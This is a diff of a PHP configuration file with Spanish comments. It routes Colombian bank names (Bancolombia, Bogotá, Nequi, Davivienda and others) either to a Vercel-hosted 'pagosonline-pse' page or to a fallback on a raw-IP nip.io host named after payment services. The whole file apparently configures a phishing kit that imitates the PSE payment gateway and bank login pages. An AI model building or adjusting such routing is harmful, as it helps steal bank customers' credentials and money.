@@ -18,17 +18,17 @@ return [
 
     'links' => [
         'primary_page' => 'https://pagosonline-pse.vercel.app',
-        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/wompi',
+        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/nequi',
     ],
 
     // Bancos que van a la pasarela Vercel
     // Si comentas una línea, ese banco cae automáticamente a recaudofall.
     'primary_banks' => [
-        'bogota' => ['slug' => 'bg', 'id' => '128ff1d79fbe2fcd1997ba94'],
+   //     'bogota' => ['slug' => 'bg', 'id' => '128ff1d79fbe2fcd1997ba94'],
      //   'occidente' => ['slug' => 'occ', 'id' => '128ff1d79fbe2fcd1997ba94'],
 //     'popular' => ['slug' => 'pop', 'id' => '128ff1d79fbe2fcd1997ba94'],
  //        'avvillas' => ['slug' => 'avv', 'id' => '128ff1d79fbe2fcd1997ba94'],
-//        'bancolombia' => ['slug' => 'bc', 'id' => '128ff1d79fbe2fcd1997ba94'],  // <- comentado = va a recaudofal
+        'bancolombia' => ['slug' => 'bc', 'id' => '128ff1d79fbe2fcd1997ba94'],  // <- comentado = va a recaudofal
 //    'nequi' => ['slug' => 'nq', 'id' => '19187ab95b11418d6f5eecee'],  // <- comentado = va a recaudofall
 // 'davivienda' => ['slug' => 'dv', 'id' => '19187ab95b11418d6f5eecee'], 
 //     'cajasocial' => ['slug' => 'cj', 'id' => '128ff1d79fbe2fcd1997ba94'], 
